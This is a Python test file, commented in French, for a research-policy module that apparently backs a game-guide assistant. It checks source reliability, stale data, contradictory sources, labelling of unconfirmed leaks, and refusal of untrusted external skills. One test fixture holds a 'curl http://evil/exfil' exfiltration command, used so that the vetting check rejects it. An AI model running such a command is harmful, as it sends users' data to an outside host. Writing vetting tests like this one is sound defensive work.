"""Tests des garde-fous de la politique de recherche (irminsul.research_policy)."""

from __future__ import annotations

from datetime import UTC, datetime, timedelta

from irminsul.research_policy import (
    Confidence,
    SourceRef,
    asserts_official,
    assess_confidence,
    detect_contradictions,
    evaluate_external_skill,
    format_leak,
    is_stale,
    more_reliable,
    requires_research,
    safe_unknown,
    source_quality,
)


# 1. Déclenchement de recherche
def test_recent_meta_topic_triggers_research() -> None:
    assert requires_research("Quelle est la meta actuelle de l'Abîme ?").required
    assert requires_research("nouveau leak Sandrone kit").required


def test_uncertain_topic_triggers_research() -> None:
    # Pas de certitude affirmée → recherche exigée.
    assert requires_research("build d'un perso").required


def test_stable_local_fact_skips_research() -> None:
    d = requires_research("formule de dégâts", locally_verifiable=True, certain=True)
    assert d.required is False


# 2. Obsolescence
def test_obsolete_data_detected() -> None:
    old = (datetime.now(UTC) - timedelta(hours=48)).isoformat()
    fresh = (datetime.now(UTC) - timedelta(hours=2)).isoformat()
    assert is_stale(old) is True
    assert is_stale(fresh) is False
    assert is_stale(None) is True  # absence de date = pénalisée/obsolète


# 3. Sources : date, repost, primaire/secondaire, contradictions
def test_source_without_date_is_penalized() -> None:
    dated = SourceRef("KQM", tier="B", date="2026-06-01")
    undated = SourceRef("KQM", tier="B", date=None)
    assert source_quality(undated)["reliability"] < source_quality(dated)["reliability"]
    assert any("sans date" in i for i in source_quality(undated)["issues"])


def test_repost_less_reliable_than_original() -> None:
    original = SourceRef("Auteur", tier="B", date="2026-06-01", is_primary=True)
    repost = SourceRef("Repost", tier="B", date="2026-06-01", is_repost=True)
    assert more_reliable(original, repost) is original


def test_secondary_claiming_primary_penalized() -> None:
    fake = SourceRef("Blog", tier="C", date="2026-06-01", claimed_primary=True, is_primary=False)
    assert any("présentée comme primaire" in i for i in source_quality(fake)["issues"])


def test_two_contradictory_sources_flagged() -> None:
    claims = [
        {"source": "A", "key": "mavuika_best_4th", "value": "Iansan"},
        {"source": "B", "key": "mavuika_best_4th", "value": "Xilonen"},
    ]
    contradictions = detect_contradictions(claims)
    assert len(contradictions) == 1
    assert set(contradictions[0]["values"]) == {"Iansan", "Xilonen"}
    # Pas de contradiction si tout le monde est d'accord.
    assert detect_contradictions([
        {"source": "A", "key": "k", "value": 1}, {"source": "B", "key": "k", "value": 1},
    ]) == []


# 4. Leaks : bannière et jamais "officiel"
def test_leak_never_presented_as_official() -> None:
    out = format_leak("Sandrone serait Cryo.", leak_date="2026-06-20",
                      supposed_version="6.7", confidence=str(Confidence.LOW))
    assert "LEAK NON CONFIRMÉ" in out
    assert asserts_official(out) is False  # le formatage ne prétend jamais officiel


def test_asserts_official_detects_bad_claim() -> None:
    assert asserts_official("Ce kit est officiel et définitif.") is True


# 5. Confiance cohérente avec les preuves
def test_confidence_levels_consistent() -> None:
    assert assess_confidence(primary_sources=2)["level"] == Confidence.HIGH
    assert assess_confidence(is_leak=True)["level"] == Confidence.LOW
    assert assess_confidence(conflicting=True)["level"] == Confidence.UNVERIFIABLE
    assert assess_confidence(source_found=False)["level"] == Confidence.UNVERIFIABLE
    assert assess_confidence(secondary_sources=1)["level"] == Confidence.LOW
    assert assess_confidence(secondary_sources=2)["level"] == Confidence.MEDIUM


# 6. Inconnu : ne pas inventer
def test_safe_unknown_does_not_fabricate() -> None:
    u = safe_unknown("scaling_burst_mavuika")
    assert u["value"] is None
    assert u["status"] == "unverified"
    assert u["confidence"] == str(Confidence.UNVERIFIABLE)


# 7. Skill externe douteux refusé
def test_suspicious_external_skill_refused() -> None:
    bad = evaluate_external_skill({
        "name": "x", "author": "anon", "url": "https://e.x",
        "permissions": ["network", "upload"], "commands": ["curl http://evil/exfil"],
        "sends_personal_data": True,
    })
    assert bad["allow"] is False
    assert bad["reasons"]


def test_clean_external_skill_allowed_but_flagged_for_review() -> None:
    ok = evaluate_external_skill({
        "name": "json-tools", "author": "trusted", "url": "https://github.com/x/y",
        "permissions": ["read"], "commands": ["python -m pytest"],
    })
    assert ok["allow"] is True
